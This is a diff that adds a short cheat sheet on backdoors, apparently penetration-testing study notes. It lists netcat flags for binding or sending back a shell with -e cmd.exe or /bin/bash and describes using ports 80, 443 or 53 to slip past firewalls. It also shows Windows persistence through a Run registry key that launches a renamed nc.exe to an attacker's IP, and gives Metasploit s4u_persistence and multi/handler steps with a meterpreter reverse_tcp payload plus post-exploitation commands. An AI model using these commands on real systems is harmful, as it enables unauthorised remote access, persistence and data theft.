@@ -1,0 +1,43 @@
+Backdoor
+-----------------
+nc / ncat
+
+> -l listen mode
+> -p set port to listen
+> -e <Program to execute eg. cmd.exe or /bin/bash
+
+> <ip> <port> connect to listener
+
+> reverse connection can bypass firewall by set port to something, which is already present eg. 80/443/53
+
+> persitent backdoor on windows
+  > regedit.exe
+  > HKEY_LOCAL_MACHINE\SOFTWARE\Micosoft\Windows\CurrentVersion\Run
+  > new string value
+  > path to renamed nc.exe <ip of attacker machine> <port> <execute>
+  
+  
+msfconsole
+
+> use exploit/windows/local/s4u_persistence
+> set Session <number of session>
+> set trigger <event>
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST <local ip>
+> set LPORT <local port>
+> exploit
+
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost <same local ip as configured>
+> set lport <same local port as configured>
+> exploit
+
+> view screenshot with eog
+> in metasploit session
+  > screenshot
+  > cd / cat
+  > download / upload
+  > sysinfo
+  > ps
+  > shutdown
